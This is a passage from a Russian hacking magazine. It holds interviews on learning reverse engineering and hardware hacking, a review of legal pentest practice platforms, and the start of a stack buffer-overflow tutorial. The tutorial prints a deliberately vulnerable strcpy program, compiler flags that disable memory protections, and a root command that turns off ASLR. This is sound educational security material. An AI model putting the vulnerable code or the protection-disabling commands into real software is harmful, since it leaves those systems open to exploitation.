   Также меня серьезно вдохновил Крис Касперски, было очень интересно
читать его статьи и книги. И конечно, мас са исходных текстов, в основном
на ассемблере. Бесконечные эксперименты, опы ты с исходниками, ком‐
пиляция разных макетов и пос тоянное чтение статей и книг.
  Особая радость была, когда что‐то получалось, а знания удавалось воп‐
лотить в код и увидеть, как это работает. На тот момент это здорово мотиви‐
ровало.


С чего начинать в первую оче редь?
По моей специальности — с ассемблера! Мно гие сейчас говорят, что этот
язык мертв, — я с этим не согласен. Ты как минимум должен уметь свободно
читать код на асме, который выда ют отладчики и дизассембле ры.
  Из языков высоко го уровня могу посоветовать С/С++ — он постоянно
развивается и совершенству ется. Масса кода на нем написана, и масса кода
пишется прямо сейчас. Хотя стоит обра тить внимание и на более современ‐
ные языки — Rust и Golang. Хотя бы чтобы быть в курсе современных тен‐
денций.
   У исследователя или программиста, который специализируется на Win‐
dows, справочник MSDN должен быть всегда под рукой. И стоит читать соот‐
ветствующую литературу. Но тут кому что интерес но: анализ вирусов, поиск
уязвимостей, системная раз работка и про чее. И конечно, нужны собственные
эксперименты и копание в коде. Ты должен свободно управляться с отладчи‐
ком и дизассембле ром, знать тонкости твоего компилятора.
  Кроме того, хоть это и очевидно, но порекомендую по воз можнос ти изу‐
чить английский — хотя бы до уровня свободного чте ния. Помни: знания —
награда за действие! :)


Какие есть варианты работы?
Чего греха таить — тут в нашей области все неп росто. С одной стороны, пла‐
тят неплохо, с другой — ниша таких исследова ний и раз работок мала
и работу придется поискать. Но можно найти и фриланс, и офи циальное тру‐
доустройство — кому как больше нра вится. Но надо будет постараться,
и здесь многое зависит от уровня тво их скиллов. А если все получится, то
поверь, голодать ты не будешь! :)


По делись полез ными ссыл ками
 • Project Zero
 • ExeLab
 • windows deep internals
 • hasherezade’s 1001 nights
 • Хакер.ru!





                  FABULOUS FABERGE
               Циф ровыхъ дѣлъ мас теръ, автор Xakep.ru


Как ты учил ся тому, что уме ешь?
С железом я познакомился в хакспейсе «Нейрон». Именно там мне показали
Arduino Uno. Тогда (это было дос таточно давно) эти платы еще не были так
популярны. Мне было сказано, что одна такая платка и микросхема К555АП4
(до сих пор помню) решат все мои проб лемы — тог да они лежали в сфе ре
робототехники и инверсной кинема тики. Я решил попробовать. Более три‐
виальный старт трудно себе предста вить.
  Следующей ступенькой было портирова ние кода на «серьезное» и весьма
специфичное железо — процессоры «Мультиклет». Уди вительно, но разбор
всех тонкостей и нюансов помог мне лучше понять микроконтрол леры AVR.
Внезапно у них нашлось что‐то общее. После этого переход к популярным
платформам на ARM прошел отно ситель но легко и без болез ненно.
   Также «просветлению» помога ет чтение документации. Или хороших книг
по теме. Могу порекомендовать две: Hacking the Xbox и «Ис кусс тво эксплой‐
та». Это довольно старые книги, и технологии с тех пор ушли далеко вперед,
но они дают глав ное — понимание основ и принципов.


С чего начинать в первую оче редь?
Первые шаги, наверное, легче будет делать на том же самом Arduino. Просто
нужно понимать, что это только верхушка айсберга, и ни в коем слу чае
не останавливаться. Спус титься на уро вень ниже — C, асм, регистры
периферии, интерфейсы. Потом перейти на современное железо. Проще
выбрать что‐то популярное, что поддерживается сообществом (рекомендую
STM32).
  Из книг тебе поможет хорошая (толстая) книжка по С/С++, «Ис кусс тво
схемотехники», «Цифровая схемотехника и архитек тура компьютера», «Ядро
Cortex‐M3 компании ARM». Также из необычного, но инте ресного — журнал
«Микропроцессорные средс тва и системы» (да, он очень старый, но я читал
запоем).


По делись полез ными ссыл ками
Вот несколько из недавних ста тей, которые мне понравились.
 • «Взлом прошивок USB‐устройств»
 • Modern Vulnerability Research Techniques on Embedded Systems
 • Reverse engineering STM32 ﬁrmware
 • Загрузчик с шифрованием для STM32

И вот еще хороший план самообу чения по безопасности ARM.
COVERSTORY

ГДЕ УЧИТЬСЯ
   ПЕНТЕСТУ
       ОБЗОР ПЛОЩАДОК ДЛЯ ПРАКТИКИ
           НАВЫКОВ ЭТИЧНОГО ХАКЕРА





                                                                                   snovvcrash
                                                                                    Безопасник, временами
                                                                                    питонщик, местами
                                                                                        криптоана(рхист)литик, по
                                                                               необходимости системный
                                                                                     администратор
                                                                                        snovvcrash@protonmail.ch





В этой статье мы выясним, какие пло щадки позволяют отта‐
чивать  мас терс тво  взло ма  и  ценятся  специалистами
по безопасности. Они позволяют этичным хакерам быть
этичными до последнего, при этом не терять хватку, регуляр‐
но практиковаться со свежими уязвимостями и оставаться
в рамках закона.


Сфера ИТ развивается семимильными шагами, компьютеры проникают
в жизнь все глубже, цифровые системы становят ся более комплексны ми,
а соответственно, растет и поверхность атак. Это в свою очередь рождает
спрос на специалистов по безопас ности, в том числе — этичных хакеров.


        WWW

                     Подробнее о профессии (или даже профессиях)
                        этичного хакера читай в колонках Юрия Гольцева
                      и Дениса Мак рушина. Начать можешь с матери‐
                       ала  «Этичный  взлом  по  шагам» —  он  дает
                       неплохое представление о том, чем и как занима‐
                        ется пентестер в белой шляпе.


Этичный хакер дол жен отлично раз бирать ся во всей спе цифике темной сто‐
роны: если ты знаешь, как сло мать, и поддерживаешь эти знания в акту аль‐
ном состоянии, то сможешь давать и рекомендации по защите. В общем,
главное здесь — практика, но как ей занимать ся, не нарушая закон?
  На заре нулевых мно гие энту зиасты кибербезопасности становились
преступниками, хотя час то преступление заключалось лишь в любопытс тве.
Собственно, в «Хакере» то и дело мож но было встретить рассказы о взломах
реальных систем, написанные от первого лица.
   Альтернатив тогда не было, зато любопытства было хоть отбавляй. Но так
не могло продол жаться долго. Времена изменились, и хакерам пришлось
найти способы совершенс твовать навыки нас тупательной безопас ности
легально. Сегодня существу ет ряд платформ, где всем желающим дают воз‐
можность практиковаться без риска попасть под тяжелую руку закона.


             INFO

                   В этой статье внимание сосредоточено на отно‐
                        сительно  бесплатных  лабораториях,  которые
                      не требуют в обязательном порядке купить под‐
                        писку  для  доступа  к  своей  инфраструктуре.
                     Из платных аналогов, предоставляющих сво им
                        клиентам, помимо всего прочего, расширенные
                      методические материалы, можно выделить Virtual
                        Hacking Labs и PentesterLab Pro, схожие с курсом
                  PWK.



СТРУКТУРА РЕСУРСОВ
Есть несколько направлений, которых может при держиваться тот или иной
ресурс, предлагающий практику пентеста. Обычно все их можно отнести
к одному из трех больших разделов.
 1. CTF-таски — всем хорошо извес тный Capture the Flag, который пред‐
   ставляет собой отдель ные задачи по определенной тематике. Обычно
   присутствуют такие категории, как Reverse, Exploit (или PWN), Web, Crypto,
   Stego, Forensics, OSINT и Misc. Чуть реже к ним добавляется PPC (спор‐
   тивное программирование). Процесс выполнения такой задачи достаточ‐
   но прямолинеен: заг ружаешь файлы, входящие в состав таска, к себе
   на машину, находишь флаг, вво дишь его на ресурсе и получаешь свою
   награду.
 2. Уяз вимые виртуальные машины — более приближенное к реальной
   жизни испытание, которое заключается во взломе заведомо уяз вимого
   хоста. Конечная цель — получение контро ля над при вилегированным акка‐
   унтом системы. Доказа тельством окончательного захвата машины обычно
   служит демонстрация воз можнос ти чтения файлов (также содержащих
   своеобразный «флаг»), дос тупных пользователям с соответс твующими
   привилегиями. Процесс прохождения раз нится в зависимости от устрой‐
   ства площадки, на которой обитает уяз вимый  хост: это могут быть
   как «живые» хосты, которые в текущий момент непосредс твенно находятся
   в сети на серверах площадки (онлайн‐лабора тории), так и загружаемые
   образы для самостоятельного запус ка в вир туальной среде.
 3. Виртуальные локальные сети — как правило, виртуальные леса Active
   Directory, где от учас тников требуется захватить контроллер и закрепиться
   в сети. В ходе прохождения могут использовать ся самые раз ные способы
   для продвижения по инфраструктуре: от конкурентной раз ведки и фишин‐
   га до эксплуатации зиродеев. Слож ность выполнения таких задач сопос‐
   тавима с реальными кейсами, а зачас тую даже пре восходит их. Доступ
   к лабораториям такого типа обычно плат ный, а их услуги могут быть мак‐
   симально полезны людям, готовящимся к про фессиональным сертифика‐
  циям типа OSCP.

Для поддержания энтузиазма безопасников, которые пришли на такие ресур‐
сы, владельцы часто предлага ют им бонусы за про хождение каждого вида
заданий — они могут выражаться в «плюсиках к карме», которая видна в про‐
филе игрока и в «Зале славы». Мес то в таком топе потом может стать
хорошим подспорьем на собеседовании.
  Посмотрим поб лиже на наиболее крупные и известные площад ки, где ты
сможешь побаловать своего внутреннего хакера.


HACK THE BOX
Hack The Box (или HTB) — мой любимый ресурс, который позволяет отта‐
чивать искусство тестирования на проникновение. По совместительству это,
пожалуй, одна из самый масштабных плат форм, где на текущий момент дос‐
тупно 127 уязвимых машин, 65 CTF‐задач и нес колько видов хардкорных вир‐
туальных лесов AD. То есть, как ты уже понял, здесь есть все описанные выше
области.





                           Hack The Box

За несколько прошлых лет Hack The Box стал максимально популярен среди
исследователей  безопас ности  всех  мас тей:  он  отличается  удобным
веб‐интерфейсом  для  управления  активны ми  инстансами  виртуалок,
отзывчивой техподдержкой и, что важнее всего, пос тоянно обновля ющимся
списком уязвимых хостов.
   График выхода новой машины «в онлайн» очень прост: каждую неделю
релизится новая тачка и становится доступной для взлома всем зарегистри‐
рованным на ресурсе игрокам; в то же время одна из машин, которая
«висела» в онлайне до этого момента, ухо дит в пул отозванных машин.
Одновременно в онлай не находится 20 машин... но это только на бес платном
сервере. При офор млении VIP‐подписки (£10 в месяц или £100 в год) ты смо‐
жешь самостоятельно вытягивать любой «уста ревший» хост из пула в онлайн
на выделенном сервере и проводить свои тес ты. Вместе с этой суперспособ‐
ностью тебе откроется дос туп к официальным про хождениям в формате PDF,
которые составляют сами сотрудники ресурса.
  Регистрация на Hack The Box предполага ет решение тривиального
веб‐таска для получения кода на приглашение, поэтому я всегда условно счи‐
тал этот ресурс полузакрытым. Почему условно? Потому что таск и правда
элементарный, и в свое время я даже писал однострочник для генерации
очередного инвайта. Раз бирать сам процесс в рамках этой статьи не будем,
поскольку невежливо раскрывать все подробности решения и обес ценивать
работу команды HTB. Тем не менее гайдов в сети предостаточно.





                              hackthebox.eu/invite

Несмотря на то, что воз можен пря мой доступ к странице регистрации (где
тебя даже встретят воодушевляющим «Congratulations!»), попытка соз дать
аккаунт без предварительно сгенерированного инвайт‐кода не увенчается
успехом. Хотя, как мне казалось, изна чально даже переход на hackthebox.
eu/register был недоступен прос то так.





                            hackthebox.eu/register

Порог вхождения на эту платформу я бы оценил как средний: нес мотря на то,
что большую часть активных инстансов сос тавляют виртуальные машины
высокой сложности, на сайте можно найти и простые машины, рекомен‐
дуемые для прохождения начина ющим свой путь специалистам. Гиб кая сис‐
тема фильтров позволит тебе подобрать машину на свой вкус.





               Фильтра ция списка сущес твующих ВМ


             INFO

                        «Хакер» уже пуб ликовал несколько прохождений
                      виртуалок с Hack The Box:
                      •Укрощение Kerberos. Захватываем Active Direc‐
                               tory на виртуальной машине с Hack The Box
                    •Великий пакостник. Пробираемся через дебри
                           IPv6 к root‐флагу виртуалки с Hack The Box
                    •Полет в стратосферу. Ломаем Struts через Ac‐
                            tion‐приложение и мастерим Forward Shell
                     •Неп равильный CTF. Одноразовые пароли, буй‐
                          ство LDAP‐инъекций и трюки c архи вато ром 7z


Стоит заметить, что Hack The Box пользует ся услугами DigitalOcean для раз‐
вертывания своей облачной инфраструктуры, а так как РКН блокиру ет многие
IP‐адреса DigitalOcean, то дос туп к некоторым ресурсам HTB может быть зат‐
руднен из нашей страны. Однако в данном слу чае в основном речь идет
о веб‐тасках раздела CTF, где уяз вимые серверы «смотрят» напрямую
в интернет, а не спрятаны за VPN, как основная лаборатория с виртуальными
машинами.


                                     Продолжение статьи →
COVERSTORY            ← НАЧАЛО СТАТЬИ

        ГДЕ УЧИТЬСЯ
           ПЕНТЕСТУ
         ОБЗОР ПЛОЩАДОК ДЛЯ ПРАКТИКИ НАВЫКОВ
                            ЭТИЧНОГО ХАКЕРА





ROOT ME
Root Me — еще одна уникальная пло щадка для практики пентеста и решения
головоломок в духе CTF. Если снова взглянуть на наш список разновид ностей
ресурсов в начале статьи, то можно сказать, что эта платформа включает
в себя первую область и сво еобразную комбинацию двух пос леду ющих.





                               Root Me

Раздел с задачами CTF действительно внушительный: в него входят 11 раз‐
делов с 344 тасками.





                         CTF‐таски — Root Me

Особенность многих из них заключается в том, что тебе нужно будет взаимо‐
действовать с удален ным хос том, а не прос то иметь дело с локальными фай‐
лами таска. Удобно, что для подключения можно использовать WebSSH пря‐
мо из браузера.





                Сессия WebSSH из бра узера Firefox

Однако главная фишка сайта — раз дел CTF all day: в этом режиме тебе дос‐
тупен выбор из двадцати «комнат», каж дая из которых активна в течение
четырех часов. Присоединившись к любой из них, ты получишь краткую
справку об объекте атаки и информа цию о рас положении флагов. Некоторые
комнаты — это пол ноценные лаборатории со связкой из нескольких вир‐
туальных машин с контроллером AD и общей легендой. Нужно сильно пос‐
тараться, чтобы их одолеть.





                 CTF all day — 20 активных комнат

Что касается общего уровня сложности, то, по моему мне нию, он несколько
ниже, чем у Hack The Box. Несмотря на это, большее разнооб разие CTF‐тас‐
ков и возможность потренироваться на более лай товых полигонах с Active Di‐
rectory ставят площадку Root Me в список must‐have‐ресурсов для практики
пентеста.


VULNHUB
VulnHub — старин ный дамп образов уяз вимых виртуальных машин, под‐
держиваемый энтузиас тами. Это полностью бес платный источник, откуда
любой  желающий  может   загрузить  понравившуюся  ему  виртуал ку
и приступить к поиску флагов.





                               VulnHub

Одно из самых крупных преимуществ VulnHub — огромное количество рай‐
тапов по виртуалкам, доступных в сети, и отсутс твие каких‐либо ограничений
на их публикацию (Hack The Box и Root Me накладывают временные рамки,
в течение которых действует зап рет на размещение прохождений в сети —
в противном случае есть риск схва тить бан, если публикуешься под своим
никнеймом).
   Большой выбор машин и райтапов делают VulnHub отличной отправной
точкой для людей, которые совсем не знают, с чего начать свои эксперимен‐
ты в области пен теста.
  Из минусов:
 • Часто к машинам нет внятного описания, которое позволило бы понять,
   что они собой представляют. Так как все раз нообразие существу ющих
   на VulnHub машин можно грубо разделить на две категории (с направлен‐
   ностью в жанр Task Based CTF и более приб лиженные к реальной жизни
   виртуалки), то каждый раз, загружая новый образ, ты, в сущности, берешь
   кота в мешке и не знаешь, с задачей какого типа тебе предстоит
   столкнуться.
 • Тотальное отсутствие машин на Windows. Ну оно и понятно — все же опен‐
   сорсный ресурс.

В остальном VulnHub — это прекрасный способ убить вечер с пользой
и  «поиграть»  с  интерес ными  образами,  собранными  безопасниками
для безопасников.


        WWW

                     Полный список доступных на VulnHub виртуалок
                   можно найти по ссылке.



РЕКОМЕНДАЦИИ ДЛЯ НАЧИНАЮЩИХ
В тезисах постараюсь изло жить основные моменты, которые обязательно
пригодятся тем, кто планирует начать работу с каким‐либо из выше описанных
ресурсов.
  Для начала — про нас тройку окру жения.
 1. Средства виртуализации — твои друзья. Выбери одно из решений
   для работы с обра зами виртуальных машин  (VirtualBox или VMware
   для Windows, KVM для Linux) и придерживайся его. Умение быс тро раз‐
   ворачивать гостевые ОС пригодится не только в сфере безопас ности.
 2. Дистрибутивы, ориентированные на проведение пентестов — это круто.
    Kali Linux, Parrot OS, BlackArch Linux, Commando VM, — неважно, что ты
   выберешь, главное, что они удобны для уста новки и практичны в исполь‐
   зовании (на начальных этапах я бы оста новился на Kali или Parrot). Незави‐
  симо от того, что ты решил уста новить — устанавливай также строго
   в качестве виртуальной машины: таким обра зом ты уменьшишь риски
   нежелательных воздействий со стороны дру гих, возможно, менее этичных
   хакеров, если планиру ешь подклю чаться к онлай новым лаборатори ям (то
   есть выделенным вир туальным сетям) по VPN.
 3. Изучи консоль и сок рати использование графичес кого интерфейса ОС —
   это  полезный  навык  практически  для  любой  области   IT.  Работая
   в командной стро ке, ты значитель но увеличишь свою производительность,
   научишься лучше концентрироваться на текущей проблеме (а не на перек‐
   лючении между открытыми окнами) и не будешь бес помощен, когда гра‐
   фического интерфейса не будет под рукой в принципе. В этом же пункте
   настоятельно рекомендую научиться обра щению с каким‐либо терминаль‐
  ным мультиплексором (я предпочитаю tmux, хотя уверен, что многие
   не сойдутся со мной в этом выборе), чтобы не переключаться между
   вкладками в окне эмулятора терминала.

Теперь непосредственно про процесс исследова ния уязвимых виртуальных
машин.
 1. «Enumeration  is the Key» — самый частый ответ наряду с «Try Harder!»
   на крики о помощи на всевоз можных форумах. Начальный сбор информа‐
   ции об объекте атаки — пожалуй, самый кропот ливый этап всей кампании,
   а иногда и самый тру доемкий. Чем больше начальных данных, тем больше
   материала для анализа — и больше поверхность возможных атак. Всегда
   оставляй какую‐либо разведывательную ути литу работать в фоне для про‐
   верки очередного вектора про никновения.
 2. Знай свои инструменты. Умение применить нужный софт в нужной ситу‐
   ации — половина успеха операции. В сети сущес твует множество списков
   полезных инструментов для взло ма, однако эти списки ничего не стоят,
   если  никогда не пробовал инстру мент «вживую». Поэтому, работая
   с чем‐то новым, не пренеб регай командой man и опцией help
   для получения базово го представления о воз можнос тях программы.
 3. Не стесняйся искать информа цию в сети, «гуг лить — не стыдно»! Сфера
   компьютерной безопас ности колоссально велика, очень трудно объять ее
   целиком, да и не всегда это нужно, если можно что‐то быстро найти
   на просторах интернета. Это не то же самое, что быть скрипт‐кидди, —
   до тех пор, пока можешь внятно объяснить, как ты добил ся того или иного
   результата (с техничес кими подробнос тями), вол новаться не о чем.
 4. Читай блоги и райтапы сво их коллег — даже если ты уже одолел какую‐то
   машину. Взгляд на одну и ту же проблему под раз ными углами способству‐
   ет расширению рамок мышления и накоп лению разностороннего опы та
  решения однотипных  задач. Это может ока заться весьма полезным
   в условиях ограниченных ресурсов (сработает не одно, так другое).
 5. Не ленись вести заметки — как непосредственно в процессе пентеста
   для поддержания орга низованности работы (здесь может помочь Cherry‐
   Tree или KeepNote), так и пос ле успешного завершения взлома для сис‐
   тематизации  полученных  зна ний. Отличным  вариантом может  стать
   написание райтапа к побежденной машине, потому что в процессе объ‐
   яснения своего прохож дения другим ты еще раз закрепляешь усвоенную
  информация.

Happy hacking!


        WWW

                    Бонус: легендарный хакерский форум  Antichat
                       недавно запустил свою CTF‐площадку. Самому
                       пока не удалось испробовать — но не упомянуть
                           грех.
ВЗЛОМ





                                                                                     snovvcrash
                                                                                       Безопасник, временами
                                                                                       питонщик, местами
                                                                                           криптоана(рхист)литик, по
                                                                                 необходимости системный
                                                                                       администратор
                                                                                          snovvcrash@protonmail.ch


В КОРОЛЕВСТВЕ
        PWN

              ПРЕПАРИРУЕМ КЛАССИКУ
              ПЕРЕПОЛНЕНИЯ БУФЕРА
           В СОВРЕМЕННЫХ УСЛОВИЯХ




Сколько раз и в каких только контекстах не писали об уяз‐
вимости переполнения буфера! Однако в этой статье я пос‐
тараюсь предоставить универсальное практическое «вступ‐
ление» для энтузиастов, начинающих погружение в низ‐
коуровневую  экс плуата цию, и на примере  того самого
переполнения рассмотрю широкий спектр тем: от существу‐
ющих на данный момент механизмов безопасности ком‐
пилятора GCC  до  точечных  особен ностей  разработки
бинарных эксплоитов для срыва стека.


Могу поспорить: со школьной скамьи тебе твердили, что strcpy — это такая
небезопасная функция, использование которой чревато попаданием в неб‐
лагоприятную ситуацию — выход за гра ницы доступной памяти. Да и вообще
«лучше используй Visual Studio». Почему эта функция небезопас на? Что
может произойти, если ее использовать? Как эксплуатировать уязвимости
семейства Stack‐based Buﬀer Overﬂow? Ответы на эти вопросы я и дам далее.
   Вот о чем конкретно пойдет речь.
 • Обзор средств защиты, используемых компилятором GCC и опе раци‐
  онными системами семейства Linux в целом.
 • Работа с отладчиком GDB и прокачанным рас ширением PEDA.
 • Анализ ассемблер ного кода при разных опци ях компиляции.
 • Создание и тестирова ние шелл‐кодов.
 • Разработка экспло итов для уяз вимого к переполнению буфера исполня‐
  емого файла: перезапись адреса возврата, рас положе ние полезной наг‐
   рузки в стеке, NOP‐срезы.
 • Использование дампов памяти ядра для экс плуата ции уязвимости за пре‐
   делами среды отладчика.
 • Анализ нового пролога функции main и соз дание эксплоита, применимого
   для случая компиляции прог раммы без фла га mpreferredstack
  boundary=2.

Начнем, впереди дол гое путешествие.


OVERFLOW.C
Итак, перед тобой есть исходник на языке C. Файл называется overflow.c
и реализует простые функции: копирование полученной от пользователя
строки в локальный буфер и вывод содержимого последнего на экран. Что
с ним не так?
 • файл: overflow.c
 • компиляция: gcc g Wall Werror O0 m32 fnostackpro
  tector z execstack nopie Wl,z,norelro mpreferred
  stackboundary=2 o overflow overflow.c
 • запуск: ./overflow <СТРОКА>


#include <stdio.h>
#include <string.h>


int main(int argc, char* argv[]) {
  // 128‐байтный массив типа char
  char buf[128];
  // копирование первого аргумента в массив buf
  strcpy(buf, argv[1]);
  // вывод содержимого буфера на экран
  printf("Input: %s\n", buf);
  return 0;
}

Очевидно, все беды кроются в функции strcpy, прототип которой определен
в заголовочном файле string.h.


char *strcpy (char *dst, const char *src);


strcpy
Функция strcpy занимается тем, что копиру ет содержимое мас сива сим‐
волов src (далее для краткости я буду писать «строка») в пред варительно
подготовленный для это го буфер dst. В чем же, собс твенно, дело? В том, что
нигде ни слова не сказано о длине исходной строки и о том, как она соот‐
носится с размером выделенного под нее буфера.
  Локальные статические переменные функций в большинстве случаев
помещаются процессором в стек вызовов (или просто в «стек»), поэтому
логично  предположить,  что именно  стек  используется  потенциальным
нарушителем в качестве площадки для сво их злодеяний: если «вылез ти»
за легитимные границы памяти, можно натворить почти что угод но. Ведь
«получить полный контроль над системой можно, только выйдя за ее пре‐
делы…».


Компиляция
Прежде чем копаться в стеке этой программы и дизассемблировать ее, раз‐
беремся с опциями, которые используются при компиляции. Так будет легче
ориентироваться.
  Я буду работать в Ubuntu 16.04.6 (i686) и использовать компилятор GCC
версии 5.4.0. Вывод информа ции о версии ядра следующий.



  $ uname ‐a
  Linux pwn‐ubuntu 4.15.0‐58‐generic #64~16.04.1‐Ubuntu SMP Wed Aug 7 14:
  09:34 UTC 2019 i686 i686 i686 GNU/Linux


Для демонстрационных целей этой статьи я, конечно, намеренно пол ностью
обезоружу компилятор, отняв у него все фишки для защиты целостнос ти
потока выполнения программ.



  $ gcc ‐g ‐Wall ‐Werror ‐O0 ‐m32 ‐fno‐stack‐protector ‐z execstack ‐no‐
  pie ‐Wl,‐z,norelro ‐mpreferred‐stack‐boundary=2 ‐o overflow overflow.c


Флаги, которые я использовал:
 • ‐g —  говорит компилятору  вклю чать  в  результат  вспомогательную
  информацию для облегчения процесса отладки.
 • ‐Wall ‐Werror — выводит предупреждения компилятора о возможной
   некорректности исполь зуемых в программе структур  и, если таковые
   находятся, прев ращает их в ошибки, что делает компиляцию невозможной
   (в нашем примере, к слову, все хорошо, поэтому компилятор мол чит).
 • ‐O0 — отклю чает оптимиза цию кода для чистоты эксперимента.
 • ‐m32 — в явном виде подчеркивает, что мы хотим 32‐битный исполняемый
  файл (в данном случае опция не необходима, так как мы сидим на 32‐бит‐
  ном дистрибутиве и бинарник будет таковым по умол чанию, однако
   для наглядности полезно).
 • ‐fno‐stack‐protector — отключает защиту компилятора от атак типа Stack
   Smashing. Это один из вариантов раз вития событий при эксплуатации уяз‐
   вимости переполнения буфера. Под этим видом защиты обычно понимают
   небольшое расширение пространс тва стека для помеще ния непосредс‐
   твенно перед адресом воз врата случай но сгенерированного целого чис‐
   ла, неизвестного нарушителю (это называется guard variable или canary —
   по аналогии с исполь зованием ка нареек для выявления рудничного газа
   в шахтах). Если значение изменилось перед возвратом из функции, зна‐
   чит, велика вероятность, что произошло вмешательство извне и адрес
   возврата пов режден или подменен. Следовательно, необходимо оста‐
   новить выполнение программы.
 • ‐z execstack — опция, передаваемая компоновщику. Ключевое слово ex
  ecstack означает, что инс трукции, рас положенные в сте ке, могут быть
   выполнены. Такое поведение являлось вполне допустимым для некоторых
   архитектур и использовалось в целях оптимизации. Однако нам эта фишка
   понадобится,  чтобы выполнить  зловредный  шелл‐код,  размещенный
   в пространстве стека.
 • ‐no‐pie — опция компоновщика, указывающая на то, что мы не хотим по‐
   зиционно‐независимый исполня емый файл (PIE, Position Independent Exe‐
    cution), использующий рандомиза цию адресно го пространства (ASLR, Ad‐
   dress Space Layout Randomization), которую в рамках этой статьи мы также
   отключим далее.
 • ‐Wl,‐z,norelro — и снова ука зание компоновщику: на это раз не помечать
   глобальную таблицу смещений (GOT, Global Oﬀset Table) как Read‐Only
   для предотвращения ее переза писи в процес се прис ваивания (RELRO,
   Relocation Read‐Only) значений адресам загрузки разделяемых биб‐
   лиотек.
 • ‐mpreferred‐stack‐boundary=2 — оказыва ет влияние на размер вы рав‐
   нивания границ стеково го фрейма. Выравнивание позволя ет увеличить
   скорость обращения процес сора к содержимому памяти, «добивая» раз‐
  мер стека до значения, крат ного некото рому чис лу. Число же это есть 2^n,
   где  n  контролируется  опцией  mpreferredstackboundary=n.
  По дефолту в современных системах n равно 4, то есть GCC пос троит сте‐
   ковые фреймы так, чтобы ESP для всех функций программы указывал
   на адреса, кратные 16 (2^4). Для начала мы будем использовать значение
  2 , поэтому GCC будет выравнивать указатель стека на четырехбайтную
   границу. Для  нас  включение  этой опции  означает намного более
   читабельный листинг ассемблера, поскольку с приходом 16‐байтных гра‐
   ниц появился и новый пролог для функции main, в котором черт ногу сло‐
   мит с непривыч ки. Нес мотря на это, в конце статьи мы пос мотрим, что кон‐
   кретно меняется при использовании этой опции, и проведем экс плуата‐
  цию без ее участия.
 • ‐o overﬂow — имя выходного файла.
 • overflow.c — наконец, то, что мы компилируем.

Отлично, с аргументами разобрались. По правде говоря, такой обширный
список не обязателен для демонс трации перепол нения. Необходимый
минимум — это ‐fno‐stack‐protector и ‐z execstack. Однако я решил
перечислить как можно больше механизмов обеспечения безопасности
исполняемых файлов, которые используются GCC. В следующих статьях я
подробнее разберу упомяну тые концепции защиты — и посмотрим, как мож‐
но их обойти.
  Последнее, что нужно сделать в качес тве подготовки, — это отключить
ASLR. Сделать это можно с пра вами суперпользователя, внеся изме нения
в один из файлов procfs настройки ядра.



  # echo 0 > /proc/sys/kernel/randomize_va_space



Стек
Вспомним картинку, которую рисовали каж дому юному девелоперу, где
демонстрируется расположение данных в стеке. Для конкретики возьмем
наш заведомо уязвимый исходник.





         Размещение данных в стеке для функции main overﬂow.c

Два важных регистра процес сора, которые учас твуют в формировании сте‐
кового кадра, — это ESP и EBP.
 • ESP — регистр общего наз начения, указыва ющий на вершину стека.
   Как известно, стек растет вниз: при добавлении в него значения адрес
  ESP уменьшается, а при извлечении (снятии) из него значения адрес ESP,
   соответственно, увеличивается.
 • EBP — регистр общего наз начения, ука зывающий на базу стекового кад‐
   ра и использующийся как своеобразное начало системы отсчета, свя зан‐
   ной с текущим кадром. Зна чение EBP меня ется, когда функция начинает
   или завершает свое выполнение, и в отличие от ESP, за изменение
   которого ответственен процессор, операции с EBP выпол няет сама прог‐
   рамма. К любому аргумен ту в стековом кадре, будь то локальная перемен‐
   ная или аргумент функции, можно легко получить доступ, используя адре‐
  сацию типа база (EBP) + смещение.

Также нельзя оставить без внимания служебный регистр EIP, который ука‐
зывает на текущую инструкцию, исполня емую процессором. Адрес возвра‐
та — это, по сути, сохраненное зна чение регистра EIP, которое в дальнейшем
будет использовано при возврате из функции инс трукцией ret по ее завер‐
шении.
  Но обо всем по порядку.


Ассемблер
Сейчас самое время рассмотреть ассемблерный код, генерируемый ком‐
пилятором. Для это го, скомпилировав overflow.c командой выше, обратим‐
ся к отладчику GDB.
   Чтобы получить листинг ассемблера, можно воспользоваться следующим
однострочником.



  $ gdb ‐batch ‐ex 'file ./overflow' ‐ex 'disas main'


Опция ‐batch говорит, что нуж но выполнить команды без инициализации
интерактивной сессии отладчика, которые, в свою оче редь, передаются
как значения аргументов ‐ex: открыть файл и дизассемблировать main.
В качестве результата я получаю такой ассемблер с синтаксисом Intel.


Dump of assembler code for function main:
   0x0804841b <+0>:     push   ebp
   0x0804841c <+1>:     mov    ebp,esp
   0x0804841e <+3>:     add    esp,0xffffff80
   0x08048421 <+6>:     mov    eax,DWORD PTR [ebp+0xc]
   0x08048424 <+9>:     add    eax,0x4
   0x08048427 <+12>:    mov    eax,DWORD PTR [eax]
   0x08048429 <+14>:    push   eax
   0x0804842a <+15>:    lea    eax,[ebp‐0x80]
   0x0804842d <+18>:    push   eax
   0x0804842e <+19>:    call   0x80482f0 <strcpy@plt>
   0x08048433 <+24>:    add    esp,0x8
   0x08048436 <+27>:    lea    eax,[ebp‐0x80]
   0x08048439 <+30>:    push   eax
   0x0804843a <+31>:    push   0x80484d0
   0x0804843f <+36>:    call   0x80482e0 <printf@plt>
   0x08048444 <+41>:    add    esp,0x8
   0x08048447 <+44>:    mov    eax,0x0
   0x0804844c <+49>:    leave
   0x0804844d <+50>:    ret
End of assembler dump.

Подобный результат можно также получить с помощью парсера объектных
файлов objdump.



  $ objdump ‐M intel ‐d ./overflow | grep 'main' ‐A19


Разберем подробнее, что здесь происходит.


0x0804841b <+0>:  push ebp
0x0804841c <+1>:  mov  ebp,esp
0x0804841e <+3>:  add  esp,0xffffff80  ; эквивалентно "sub esp,0x80"

Первые три строки — классичес кий пролог, в котором создается стековый
фрейм: значение EBP вызывающей функции сохраня ется в стеке и переза‐
писывается его текущей вершиной. Таким обра зом формируется своеоб‐
разная «зона комфорта» — мы можем обра щаться к локальным сущ ностям
в универсальном стиле независимо от того, что это за функция. Также здесь
выделяется место под локальные переменные: при бавить к ESP знаковое
значение 0xffffff80 — все равно, что вычесть из него 128 (как раз столько,
сколько нам тре буется для 128‐байтного буфера buf).


0x08048421 <+6>:  mov  eax,DWORD PTR [ebp+0xc]  ; eax = argv
0x08048424 <+9>:  add  eax,0x4                  ; eax = &argv[1]
0x08048427 <+12>: mov  eax,DWORD PTR [eax]      ; eax = argv[1]
0x08048429 <+14>: push eax                      ; подготовить
аргумент "src" для функции strcpy

Затем следуют приготовления для вызова функции strcpy. Сначала обработ‐
ка «источника» — аргумент src из прототипа strcpy: в регистр EAX помеща‐
ется строка, переданная пользователем и сохраненная в argv[1] (нулевая
